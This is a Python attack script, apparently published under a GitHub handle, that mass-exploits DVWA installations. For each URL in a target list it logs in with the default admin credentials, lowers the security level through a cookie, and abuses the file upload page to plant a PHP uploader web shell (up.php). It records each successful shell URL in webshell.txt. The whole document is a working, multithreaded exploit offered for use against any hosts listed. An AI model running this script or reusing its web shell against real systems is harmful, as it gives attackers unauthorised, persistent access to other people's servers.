import requests
from bs4 import BeautifulSoup
import urllib3
import time
from threading import Thread, Lock
import argparse
from colorama import init, Fore

# Initialize colorama for colored output
init(autoreset=True)

# Suppress only the single InsecureRequestWarning from urllib3 needed for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize a lock for writing to the file and console
file_lock = Lock()
print_lock = Lock()

# Banner function
def print_banner():
    banner = """
    ############################################################
    #                                                          #
    #                   DVWA Auto Exploit Script               #
    #                   Created By: 0xWhoami35                 #
    #                 https://github.com/0xWhoami35            #
    #                                                          #
    ############################################################
    """
    print(Fore.CYAN + banner)

# Function to process each target
def process_target(dvwa_target, username, password, file_content, file_name):
    base_url = dvwa_target.rstrip('/') + '/'
    login_url = base_url + 'login.php'
    upload_url = base_url + 'vulnerabilities/upload/'

    # Create a session
    session = requests.Session()

    try:
        # Step 1: Access the login page to retrieve the CSRF token
        login_page = session.get(login_url, verify=False, timeout=10)
        soup = BeautifulSoup(login_page.content, 'html.parser')

        # Find the user_token input field in the form
        user_token_input = soup.find('input', {'name': 'user_token'})

        # Check if the user_token input field was found
        if user_token_input is None:
            with print_lock:
                print(Fore.RED + f"Failed to process target: {dvwa_target}")
            return

        user_token = user_token_input['value']

        # Step 2: Prepare login data
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login',
            'user_token': user_token
        }

        # Step 3: Perform the login and retrieve the PHPSESSID cookie
        response = session.post(login_url, data=login_data, verify=False, timeout=10)

        # Filter out HTML and JavaScript code from the response content
        response_text = BeautifulSoup(response.content, 'html.parser').get_text()

        # Check if login was successful
        if 'Welcome to Damn Vulnerable Web Application!' in response_text:
            # Step 4: Retrieve the PHPSESSID cookie
            phpsessid = session.cookies.get('PHPSESSID')

            # Step 5: Set the security cookie value to 'low' in headers for the upload request
            session.cookies.set('security', 'low')
            session.cookies.set('PHPSESSID', phpsessid)
            session.cookies.set('security', 'low')

            # Step 6: Access the upload page to get the upload form token
            upload_page = session.get(upload_url, verify=False, timeout=10)
            soup = BeautifulSoup(upload_page.content, 'html.parser')

            # Reuse the user_token from the login page for the upload
            upload_data = {
                'MAX_FILE_SIZE': '100000',
                'user_token': user_token,  # Reusing the same user_token from login
                'Upload': 'Upload'
            }

            files = {
                'uploaded': (file_name, file_content, 'application/octet-stream')
            }

            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
                'Te': 'trailers',
                'Connection': 'close',
            }

            # Step 7: Upload the file
            response = session.post(upload_url, files=files, data=upload_data, headers=headers, verify=False, timeout=10)

            # Check if upload was successful
            if '../../hackable/uploads/up.php succesfully uploaded!' in response.content.decode():
                with print_lock:
                    print(Fore.GREEN + f"Successfully Upload Shell to target: {dvwa_target}")
                with file_lock:
                    with open('webshell.txt', 'a') as f:  # Change to append mode 'a'
                        success_message = f"{base_url}hackable/uploads/{file_name}\n"
                        f.write(success_message)
            else:
                with print_lock:
                    print(Fore.RED + f"Failed to process target: {dvwa_target}")
        else:
            with print_lock:
                print(Fore.RED + f"Failed to process target: {dvwa_target}")
    except requests.exceptions.Timeout:
        with print_lock:
            print(Fore.RED + f"Failed to process target: {dvwa_target}")
        time.sleep(5)
    except requests.exceptions.RequestException:
        with print_lock:
            print(Fore.RED + f"Failed to process target: {dvwa_target}")

# Main function to handle argparse and threading
def main():
    print_banner()

    parser = argparse.ArgumentParser(description='DVWA Auto Exploit Script, Created By: https://github.com/0xWhoami35')
    parser.add_argument('-f', '--file', type=str, required=True, help='Input file containing target URLs')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads to use')

    args = parser.parse_args()

    username = 'admin'  # Default username
    password = 'password'  # Default password

    # Read targets from the input file
    with open(args.file, 'r') as file:
        raw_targets = file.readlines()

    # Ensure each target has the correct protocol
    dvwa_targets = []
    for raw_target in raw_targets:
        raw_target = raw_target.strip()
        if not raw_target.startswith('http://') and not raw_target.startswith('https://'):
            dvwa_target = 'https://' + raw_target
        else:
            dvwa_target = raw_target
        dvwa_targets.append(dvwa_target)

    # File upload details
    file_content = '''
    <style type="text/css">
    body {
      color: #33ff33;
      background-color: black;
      font-weight: inherit;
    }
    h1,h2{
      background-color: #4D4D4D;
      color: #000000;
      text-align: center;
    }
    h3,h4,h5{
      color: silver;
      text-align: center;
    }
    </style>
    <b><br>
    <h1> Uploading </h1>
    <br><br>
    <center>
    <font color:"blue">
    <span style="font-family: monospace;">
    <span style="color: rgb(255, 255, 255);">
    <br><br>
    <font color="black"></font>
    <br></b> <?php
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50">
    <input name="_upl" type="submit" id="_upl" value="Upload">
    </form>'; if( $_POST['_upl'] == "Upload" ) { if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name']))
    {
    echo '<b>Archivo subido!</b><br><br>';
    }
    else
    {
    echo '<b>Upload Fail!</b><br><br></font>';
    }
    }
    ?>
    '''
    file_name = 'up.php'

    # Create and start threads
    threads = []
    for dvwa_target in dvwa_targets:
        thread = Thread(target=process_target, args=(dvwa_target, username, password, file_content, file_name))
        thread.start()
        threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
